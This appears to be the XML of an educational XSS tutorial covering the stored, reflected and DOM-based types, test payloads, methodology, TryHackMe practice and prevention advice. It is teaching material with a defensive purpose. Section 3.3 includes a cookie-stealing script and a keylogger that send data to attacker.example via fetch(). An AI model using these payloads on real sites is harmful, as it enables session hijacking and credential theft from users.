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7019" w14:textId="77777777" w:rsidR="00F62906" w:rsidRPr="00A5722F" w:rsidRDefault="00000000" w:rsidP="00A5722F">
      <w:pPr>
        <w:spacing w:after="160"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>Day 17 — XSS (Cross-Site Scripting) Attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9C372A" w14:textId="77777777" w:rsidR="00F62906" w:rsidRPr="00A5722F" w:rsidRDefault="00000000" w:rsidP="00A5722F">
      <w:pPr>
        <w:spacing w:after="320"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Definition • Types • Payloads • Keyloggers • Practical Walkthrough (TryHackMe) • Examples &amp; Mitigations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFD160F" w14:textId="77777777" w:rsidR="00F62906" w:rsidRPr="00A5722F" w:rsidRDefault="00000000" w:rsidP="00A5722F">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:b/>
        </w:rPr>
        <w:t>⚠️</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> Ethical Use Only</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B440215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This document is for educational and authorized testing only. Do not perform any testing on systems you do not own or have explicit permission to test.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B10C828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1. What is XSS?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDB68EC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Cross-Site Scripting (XSS) is a web vulnerability where untrusted input is processed and rendered as executable code in a victim’s browser. It typically occurs due to improper input handling and output encoding, enabling attackers to inject JavaScript that runs in other users’ sessions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0554D6AB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Impact: session hijacking, credential theft, keylogging, phishing, UI redressing, defacement.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BC02B0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Root cause: unsafe reflection or storage of user input; insecure DOM handling on the client side.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21BFE5FE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Context matters: HTML, attribute, JavaScript, style, and URL contexts each require different encodings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E702C2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2. Types of XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E61C33E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2.1 Stored (Persistent) XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578BD12D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The malicious payload is permanently stored on the server (e.g., database, comment thread, profile). Every visitor who loads the vulnerable page executes the attacker’s script.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E49945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Minimal demo payload (for testing):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D8B173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&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311C6A43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HTML attribute fallback (in case &lt;script&gt; is filtered):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A254BE1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&lt;img src=x onerror=alert("Stored XSS")&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DCD1C6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2.2 Reflected (Non-Persistent) XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79688D5D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The malicious payload is delivered in the request (URL, form) and immediately reflected by the server’s response. Attackers commonly use phishing links to trick victims into clicking.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B04337A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Example crafted URL with a &lt;script&gt; alert:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B37B18E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https://vuln.example.com/search?q=%3Cscript%3Ealert('Reflected%20XSS')%3C/script%3E</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A34D16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If the server reflects the parameter without encoding, the alert will execute in the victim’s browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD0F6D2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lastRenderedPageBreak/>
        <w:t>2.3 DOM-Based XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7499A81C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The vulnerability exists purely in client-side JavaScript. The page’s scripts read attacker-controlled data (e.g., URL hash, query) and write it into dangerous DOM sinks (e.g., innerHTML) without sanitization.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D3217F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Insecure client-side code example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB8F18F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// Vulnerable: writing attacker-controlled data into innerHTML</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>const frag = location.hash.substring(1);</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>document.getElementById('output').innerHTML = frag;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0517CE6C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Example URL that triggers DOM XSS via fragment:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D56C60B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https://vuln.example.com/#%3Cscript%3Ealert('DOM%20XSS')%3C/script%3E</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F898C6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2.4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2906" w:rsidRPr="00A5722F" w14:paraId="725A8D82" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5009924F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Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A3ECB40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Where Payload Lives</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="760814F6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How It Triggers</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2F1922D8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Typical Vector</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F62906" w:rsidRPr="00A5722F" w14:paraId="2C615289" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="16F3BAA7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Stored</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1F4C470D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Server/DB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4C4E81E8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When page is viewed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7ADA865B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&lt;script&gt;, onerror, onload</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F62906" w:rsidRPr="00A5722F" w14:paraId="7875D570" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2CA826D1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Reflected</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="49E5D99F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Request/URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="11DA7D5C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On clicking crafted link</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0607E8AC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Query param → HTML</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F62906" w:rsidRPr="00A5722F" w14:paraId="3679C1E7" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5B8A2A6A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DOM-Based</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5E8A00BE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Client JS / DOM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6F4B69DD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Client-side DOM update</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2160" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3B293241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location.hash → innerHTML</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="78109009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3. XSS Payloads (Testing &amp; Beyond)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E72904C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3.1 Basic Test Payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C168427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&lt;script&gt;alert('XSS')&lt;/script&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;img src=x onerror=alert('XSS')&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;svg/onload=alert('XSS')&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;a href="javascript:alert('XSS')"&gt;click&lt;/a&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D8D67D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3.2 Context-Aware Payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A938E0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HTML context (break out of text node):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F7BD72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&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582B909C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Attribute context (break out and add an event handler):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A57947B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"&gt;&lt;img src=x onerror=alert(1)&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CE7E410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JavaScript context (escape quotes/close statement):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57250830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';alert(1);//</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42B7F320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URL/JS URL context:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F6FCBA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javascript:alert(1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4A26D8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lastRenderedPageBreak/>
        <w:t>3.3 Exfiltration Examples (Education Only)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC0D395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Cookie exfiltration (often blocked by HttpOnly/SameSite):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4281CDED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&lt;script&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>fetch('https://attacker.example/steal?c='+encodeURIComponent(document.cookie));</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C5CBED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Simple DOM keylogger snippet:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272CF9DF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&lt;script&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>document.addEventListener('keypress', e =&gt; {</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  fetch('https://attacker.example/log?k='+encodeURIComponent(e.key));</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037AB163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4. How to Perform XSS Testing (Methodology)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F3E07C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Map inputs: search bars, comment boxes, profile settings, feedback forms, URL parameters, fragments (#hash).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF7AD64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Probe with harmless payloads first (e.g., alert).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC3C5F2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Check server reflection and stored persistence; inspect page source and network responses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038DAF0F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For DOM XSS, inspect front-end code for sinks (innerHTML, document.write, insertAdjacentHTML, outerHTML, eval).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D817344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Escalate payloads carefully in a safe lab environment (e.g., keylogger, cookie read) to demonstrate impact.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2FE6F9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5. Practical Walkthroughs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ABCAE42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5.1 Reflected XSS — Step-by-Step Example</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7375DE9C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Assume a search page reflects q= back into HTML without encoding.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE9EF33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Open: https://vuln.example.com/search?q=test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288A39FE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Replace q with a payload:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59DF7D2B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https://vuln.example.com/search?q=%3Cscript%3Ealert('Reflected%20XSS')%3C/script%3E</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD1C7CA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If an alert box appears, the input was executed as script (reflected XSS).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EA832D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5.2 Stored XSS — Step-by-Step Example</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B7134F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Navigate to a comment form on a blog/forum that displays comments to all users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686CC637" w14:textId="77777777" w:rsidR="00F62906" w:rsidRPr="00A5722F" w:rsidRDefault="00000000" w:rsidP="00A5722F">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Submit a comment containing a payload:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFD2A63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&lt;img src=x onerror=alert("Stored XSS")&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4FDBDA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When any user views the page, the alert fires — demonstrating persistent impact.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B20366" w14:textId="77777777" w:rsidR="00F62906" w:rsidRPr="00A5722F" w:rsidRDefault="00000000" w:rsidP="00A5722F">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:spacing w:before="16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5.3 DOM XSS — Step-by-Step Example</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60394BA6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Given the following JS on the page:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11181937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lastRenderedPageBreak/>
        <w:t>// Insecure</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>const q = new URLSearchParams(location.search).get('q');</w:t>
      </w:r>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>document.getElementById('results').innerHTML = q;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648C1AC3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Craft a URL:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DEB8520" w14:textId="77777777" w:rsidR="00F62906" w:rsidRPr="00A5722F" w:rsidRDefault="00000000" w:rsidP="00A5722F">
      <w:pPr>
        <w:pStyle w:val="CodeStyle"/>
        <w:spacing w:before="80" w:after="16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https://vuln.example.com/page?q=%3Cimg%20src%3Dx%20onerror%3Dalert('DOM%20XSS')%3E</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5F181A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6. TryHackMe Practice (Recommended)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2CAAD5" w14:textId="77777777" w:rsidR="00F62906" w:rsidRPr="00A5722F" w:rsidRDefault="00000000" w:rsidP="00A5722F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Practice in a legal sandbox. TryHackMe has beginner-friendly rooms such as “XSS” and web basics labs where you can reproduce reflected, stored, and DOM XSS in a safe environment. Work through tasks that involve injecting payloads into forms, URLs, and fragments; observe behavior; and answer room questions to reinforce learning.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A2A44B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7. Detection &amp; Prevention (Blue Team View)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04858EEB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Prefer context-aware output encoding (HTML, attribute, JS, URL).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C86D4B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Avoid dangerous sinks (innerHTML, document.write). Prefer textContent, setAttribute, createTextNode.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E159842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Validate and sanitize input; on the client, use DOMPurify if rendering HTML is unavoidable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D7EF6CB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Set cookies Secure, HttpOnly, SameSite=Lax/Strict to reduce theft impact.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACE82EA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Deploy Content Security Policy (CSP) to restrict inline scripts and untrusted sources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F813B8D" w14:textId="77777777" w:rsidR="00F62906" w:rsidRPr="00A5722F" w:rsidRDefault="00000000" w:rsidP="00A5722F">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Use security scanners and unit tests to catch regressions; consider SAST/DAST tooling.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BD66351" w14:textId="77777777" w:rsidR="00F62906" w:rsidRPr="00A5722F" w:rsidRDefault="00000000" w:rsidP="00A5722F">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="240" w:after="80"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A5722F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Appendix A — Common Sinks &amp; Safer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2906" w:rsidRPr="00A5722F" w14:paraId="26959BAA" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4AAD0520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Dangerous Sink</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6AAA6946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Prefer / Safer Alternative</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F62906" w:rsidRPr="00A5722F" w14:paraId="6EF4D5E8" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="54819E8D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innerHTML, outerHTML, insertAdjacentHTML</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0BAC603E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textContent, innerText, createTextNode</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F62906" w:rsidRPr="00A5722F" w14:paraId="64397B71" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="41BF05A4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document.write()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="58482ED5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DOM creation APIs</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F62906" w:rsidRPr="00A5722F" w14:paraId="6C9D544D" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0C4184A2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eval(), new Function()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4889E184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Avoid; use JSON.parse, safe parsers</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F62906" w:rsidRPr="00A5722F" w14:paraId="3EE990EB" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6AB7F585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setTimeout/Interval with string</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2E52F0B8" w14:textId="77777777" w:rsidR="00F62906" w:rsidRPr="00A5722F" w:rsidRDefault="00000000" w:rsidP="00A5722F">
            <w:pPr>
              <w:spacing w:line="276" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A5722F">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>Pass function references instead of strings</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="21696B8D" w14:textId="77777777" w:rsidR="00C74EE0" w:rsidRPr="00A5722F" w:rsidRDefault="00C74EE0" w:rsidP="00A5722F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00C74EE0" w:rsidRPr="00A57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796565">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1358391811">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="919215538">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="184560786">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="620957127">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="882400795">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1023019667">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="549419420">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="33530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F6E"/>
    <w:rsid w:val="00A5722F"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C74EE0"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00F62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D7EB5"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{EBFE98A0-314D-4056-BCFE-F545ED51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22-NTU-CS-1200</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-08-16T12:13:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>